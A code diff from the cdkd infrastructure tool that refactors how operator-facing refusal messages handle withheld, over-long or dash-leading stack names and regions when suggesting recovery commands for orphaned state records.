+ * sanitized spelling, and an operator filling the template
  * from that spelling would be aiming at the healthy sibling the gate exists to
  * protect (`'prod-api '` renders as `prod-api`; a padded region is the same
  * misdirection one flag over), so the message says where to take them from
@@ -2536,7 +2731,52 @@ function orphanRefusal(
  * reads as a hole to fill.
  */
 function withheldIdentityClause(stackName: string | undefined, region: string | undefined): string {
-  if (!identityWithheld(stackName, region)) return '';
+  const verdict = withheldVerdict(stackName, region);
+  if (stackName === undefined || verdict === undefined) return '';
+  // A name beginning with `-` must NOT be filled back in: quoted or not,
+  // Commander could read it in the positional as the option, so the fill-in
+  // instruction below would rebuild the command the gate refused. Keyed on the
+  // RAW `-`, not on the reason, because the gate reports `altered` /
+  // `too-long` first (go-to-k/cdkd#3436).
+  //
+  // Spliced right after the sentence offering the drop as the SECOND way out,
+  // so it says that way is not available for this record rather than leaving
+  // it offered beside a hole that must not be filled; and it says REPAIR, not
+  // "remove", because the `orphans` refusals' third way out forbids deleting
+  // the record (review of go-to-k/cdkd#3973, R3). One drop command, so
+  // "command", singular.
+  if (stackName.startsWith('-')) {
+    return (
+      ` — but the stack name above begins with a '-', which 'cdkd state orphan' could parse ` +
+      `as an option, so that second way is not available for this record: repair it by hand, ` +
+      `and do NOT fill the 'Drop the record' command's stack hole with that name` +
+      (verdict.region === undefined
+        ? ''
+        : `; its region is a hole too, to be taken from the 'Find the exact name' command below`)
+    );
+  }
+  // A region beginning with `-` is `--stack-region`'s VALUE, which Commander
+  // takes as given; the gate refuses it conservatively, so the sentence claims
+  // only that, and filling its hole is safe.
+  const reasons = [verdict.stack, verdict.region];
+  // Past the cap with nothing ALTERED: the prose may well show it whole (a
+  // name of 1152 characters followed by `...` is its own truncation), so "did
+  // not render exactly" would be false of it.
+  if (!reasons.includes('altered') && reasons.includes('too-long')) {
+    return (
+      ` — the stack name or region above is too long to name in a command, so take them from ` +
+      `the 'Find the exact name' command below — replace each quoted hole, quotes included, ` +
+      `with the shell-quoted value — rather than from this message`
+    );
+  }
+  if (verdict.stack === undefined && verdict.region === 'option-shaped') {
+    return (
+      ` — the region above begins with a '-', which cdkd refuses to print as an argument, so ` +
+      `take the stack name and region from the 'Find the exact name' command below — replace ` +
+      `each quoted hole, quotes included, with the shell-quoted value — rather than from this ` +
+      `message`
+    );
+  }
   return (
     ` — the stack name or region above did not render exactly, so take them from the ` +
     `'Find the exact name' command below — replace each quoted hole, quotes included, with the ` +
@@ -2557,7 +2797,7 @@ function withheldIdentityClause(stackName: string | undefined, region: string | 
  *
  * Without this, a run whose PREFIX or BUCKET was the inexact value printed
  * `--state-prefix '<prefix>'` with nothing in the message saying the hole was a
- * hole: `identityWithheld` reads the stack name and the region only, and the
+ * hole: `withheldVerdict` reads the stack name and the region only, and the
  * object-path note is suppressed whenever a prefix WAS supplied. That is
  * {@link withheldIdentityClause}'s own defect class, one fragment over.
  */
@@ -2582,22 +2822,36 @@ function withheldIdentityListCommand(
   region: string | undefined,
   recovery?: LockRecoveryContext
 ): string | undefined {
-  if (!identityWithheld(stackName, region)) return undefined;
+  const verdict = withheldVerdict(stackName, region);
+  if (stackName === undefined || verdict === undefined) return undefined;
+  // Not for a `-`-leading name whose region was named: the clause sends the
+  // operator to fix that record by hand, and a listing would only hand back
+  // the name they must not paste.
+  if (stackName.startsWith('-') && verdict.region === undefined) return undefined;
   return ['cdkd state list --json', ...recoveryCommandFlags(recovery).flags].join(' ');
 }
 
-/** A name WAS known, and it or the region beside it did not render exactly. */
-function identityWithheld(stackName: string | undefined, region: string | undefined): boolean {
+/**
+ * The shared gate's verdict when a name WAS known and the gate withheld it or
+ * the region beside it; `undefined` otherwise. Each of the clause and the
+ * listing takes the verdict from this one call instead of computing it a
+ * second time (review of go-to-k/cdkd#3973, o2).
+ */
+function withheldVerdict(
+  stackName: string | undefined,
+  region: string | undefined
+): ReturnType<typeof orphanIdentityVerdict> | undefined {
   // `''` is no identity either, as in {@link dropRecordCommand}: otherwise a
   // later direct caller gets the withheld clause while the drop command beside
   // it takes the no-identity arm.
-  if (stackName === undefined || stackName === '') return false;
+  if (stackName === undefined || stackName === '') return undefined;
   // The same `''` floor {@link dropRecordCommand} carries, so the two agree on
   // whether a region was supplied at all. Unreachable through the one builder
   // that calls this (it normalises `''` at entry) and kept for the reason
   // `dropRecordCommand` gives: a later caller inherits the floor.
   const known = region === '' ? undefined : region;
-  return !(rendersExactly(stackName) && (known === undefined || rendersExactly(known)));
+  const verdict = orphanIdentityVerdict(stackName, known);
+  return verdict.stack !== undefined || verdict.region !== undefined ? verdict : undefined;
 }
 
 /**
@@ -2609,8 +2863,9 @@ function identityWithheld(stackName: string | undefined, region: string | undefi
  * the name did not render exactly, pointed at `cdkd state list --json`, and then
  * printed `cdkd state show prod-api ...` with the trimmed spelling of
  * `'prod-api '`, naming the healthy sibling (the M2 finding of the
- * go-to-k/cdkd#3363 review). Holes follow {@link dropRecordCommand}'s rule: an
- * altered region makes both a hole, an altered name only the name.
+ * go-to-k/cdkd#3363 review). Holes follow {@link dropRecordCommand}'s rule,
+ * through {@link orphanIdentityArgs}: a WITHHELD region makes both a hole, a
+ * withheld name only the name.
  *
  * Built here rather than by widening {@link inspectCommand}, which serves four
  * other builders whose identities come from different sources (and this one no
@@ -2621,14 +2876,11 @@ function orphanInspectCommand(
   region: string,
   recovery?: LockRecoveryContext
 ): string {
-  const regionExact = rendersExactly(region);
-  const stack =
-    regionExact && rendersExactly(stackName) ? shellQuote(stackName) : commandHole('stack');
-  const where = regionExact ? shellQuote(region) : commandHole('region');
-  return [
-    `cdkd state show ${stack} --stack-region ${where} --json`,
-    ...recoveryCommandFlags(recovery).flags,
-  ].join(' ');
+  return pasteableCommand(
+    'cdkd state show',
+    [...orphanIdentityArgs(stackName, region), { literal: '--json' }],
+    recoveryCommandFlags(recovery).flags
+  ).command;
 }
 
 /**
@@ -2669,10 +2921,10 @@ function orphanInspectClause(
   recovery?: LockRecoveryContext
 ): { command?: string; sentence?: string; locations?: string[] } {
   // `''` is no identity either, the floor {@link dropRecordCommand} and
-  // {@link identityWithheld} both carry. Without it a direct caller passing
+  // {@link withheldVerdict} both carry. Without it a direct caller passing
   // `''` got an inspect COMMAND here while the drop line beside it took its
-  // no-identity arm — the disagreement {@link rendersExactly}'s note says the
-  // shared predicate rules out. Unreachable through the one builder that calls
+  // no-identity arm — the disagreement one shared verdict
+  // ({@link orphanIdentityVerdict}) exists to rule out. Unreachable through the one builder that calls
   // this (it normalises `''` at entry), which is the condition the other two
   // floors are under as well.
   if (stackName === undefined || stackName === '') {
